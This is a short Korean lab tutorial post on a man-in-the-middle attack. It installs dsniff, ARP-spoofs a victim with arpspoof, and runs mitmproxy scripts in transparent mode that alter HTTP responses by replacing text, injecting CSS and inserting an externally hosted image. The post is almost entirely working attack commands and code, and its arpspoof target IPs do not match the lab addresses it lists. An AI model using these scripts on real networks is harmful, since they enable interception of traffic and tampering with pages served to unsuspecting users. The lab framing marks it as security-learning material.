---
layout: post
title:  "Change Response (MitmProxy)"
tags: mobile proxy
---


## 환경구성

- Kali linux - Attacker
    - 192.168.0.36
- Windows - Victim
    - 192.168.0.35
- BeeBox - Web Server
    - 192.168.0.37
- AP (IpTime)
    - 192.168.0.1

Kali에 arpspoof 설치

```bash
$ apt-get install dsniff
$ apt-get install fragrouter
```

## ARP Spoofing

Kali에서 Victim과 Web Server 사이에 MITM 공격 시도

```bash
$ arpspoof -i eth0 -t 192.168.126.1 192.168.126.131
```

## MITMProxy

Modify Response

응답 값 내 문자열을 바꿔줌

```python
from mitmproxy import http

def response(flow: http.HTTPFlow) -> None:
	keyword = "health on".encode('utf-8')
	m_keyword = "health off".encode('utf-8')
	flow.response.content = flow.response.content.replace(keyword, m_keyword)
```

응답 값 내 HTML 태그 수정

```python
from mitmproxy import http

def response(flow: http.HTTPFlow) -> None:
	reflector = b"<style>body {transform: scaleX(-1);}</style></head>"
	flow.response.content = flow.response.content.replace(b"</head>", reflector)
```

응답 값 내 이미지 수정

```python
from mitmproxy import http
	def response(flow: http.HTTPFlow) -> None:
	img_src = b"<img src="
	new_img_src = b"<img src=http://pi.hakhub.net/t/hacker_200.png><img width=\"0\" height=\"0\" src="
	flow.response.content = flow.response.content.replace(img_src, new_img_src)
```

MITMProxy 스크립트 실행

```bash
$ mitmdump -s modify.py -m transparent
```